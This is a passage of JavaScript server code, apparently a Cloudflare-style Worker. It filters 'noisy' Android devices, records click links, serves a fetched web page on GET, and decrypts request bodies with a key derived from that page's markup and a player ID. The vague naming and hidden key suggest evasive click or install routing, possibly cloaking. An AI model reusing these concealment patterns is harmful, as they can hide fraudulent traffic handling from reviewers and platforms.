  }
  if (!ip) return (await fail("no_ip")) ? yes() : "";
  if (noisy(hidRaw, uga, osv, mdl, gdn, gdv)) {
    note("noisy gdn=" + gdn + " gdv=" + gdv + " mdl=" + mdl);
    try {
      await call(HOLD, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ appId: aid, androidId: hid, source: "manual" }) }, 4000);
    } catch {}
    return (await fail("noisy")) ? yes() : "";
  }

  try {
    const u = await sendClick();
    if (u.href) {
      const ok = await done("1", u.href);
      if (ok) return yes();
      note("split after click fail");
      return skip("split");
    }
    if (u.status === 0) return skip("click_timeout", 0);
    if (u.status === 202) return skip("click_202", 202);
    return (await fail("no_link", u.status)) ? yes() : "";
  } catch (e) {
    note("click err " + (e && e.message ? e.message : "err"));
    return (await fail("no_link")) ? yes() : "";
  }
  } catch {
    return "";
  }
}

function jsonInput(request, raw) {
  let bag = {};
  try { bag = raw ? JSON.parse(raw) : {}; } catch { bag = {}; }
  const auth = (request.headers.get("Authorization") || "").replace(/^Bearer\s+/i, "").trim();
  if (auth && !bag.accessToken) bag.accessToken = auth;
  if (auth && !bag.grant) bag.grant = auth;
  return bag;
}

async function unfoldBag(env, request, raw) {
  const sealed = String(raw || "").trim();
  if (!sealed || sealed.charAt(0) === "{")
    return null;
  const auth = (request.headers.get("Authorization") || "").replace(/^Bearer\s+/i, "").trim();
  if (!auth)
    return null;
  try {
    const claims = jwtBag(auth);
    const pid = clean(request.headers.get("X-Pid"), 128) || jwtClaim(claims, ["player_id", "playerId", "sub"]);
    if (!pid) {
      try { console.log("open bag skip no pid"); } catch {}
      return null;
    }
    const page = loadDesk(env).page || "";
    if (!page) {
      try { console.log("open bag skip no page"); } catch {}
      return null;
    }
    const sheet = await loadMarkup(page);
    const cover = mixLetters(sheet, pid);
    if (!cover) {
      try { console.log("open bag skip no cover"); } catch {}
      return null;
    }
    const opened = foldOut(cover, sealed) || "";
    if (!opened) {
      try { console.log("open bag fail decrypt page=" + page); } catch {}
      return null;
    }
    try { console.log("open bag ok"); } catch {}
    const bag = JSON.parse(opened);
    return bag && typeof bag === "object" ? bag : null;
  } catch {
    return null;
  }
}

async function parseClientBag(env, request, raw) {
  const sealed = await unfoldBag(env, request, raw);
  if (sealed)
    return jsonInput(request, JSON.stringify(sealed));
  const text = String(raw || "").trim();
  if (text && text.charAt(0) !== "{") {
    try { console.log("open bag fail"); } catch {}
    const bag = jsonInput(request, "");
    bag._sealedFail = true;
    return bag;
  }
  return jsonInput(request, raw);
}

function reply(body, status) {
  return new Response(body == null ? "" : String(body), {
    status: status || 200,
    headers: {
      "Content-Type": "text/plain; charset=utf-8",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Authorization, Content-Type, X-Pid",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS"
    }
  });
}

async function sendPage(env) {
  const page = loadDesk(env).page;
  if (!page) return reply("", 200);
  try {
    const r = await call(page, {
      method: "GET",
      headers: { Accept: "text/html,text/plain,*/*", "User-Agent": "Mozilla/5.0" }
    }, 6000);
    if (!r || r.status < 200 || r.status >= 300 || !r.text)
      return reply("", 200);
    return new Response(r.text, {
      status: 200,
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "Access-Control-Allow-Origin": "*"
      }
    });
  } catch {
    return reply("", 200);
  }
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname.replace(/\/+$/, "") || "/";
    if (request.method === "OPTIONS")
      return reply("", 204);
    if ((request.method === "GET" || request.method === "POST") && (path === "/b" || path === "/c"))
      return await readSlotPart(env, request, path.slice(1));
    if (request.method === "POST" && path === "/") {
      const raw = await request.text();
      const input = await parseClientBag(env, request, raw);
      const stamp = await runSave(env, request, input);
      return reply(stamp || "", 200);
    }
    if (request.method === "GET")
      return await sendPage(env);
    return reply("", 200);
  }
};
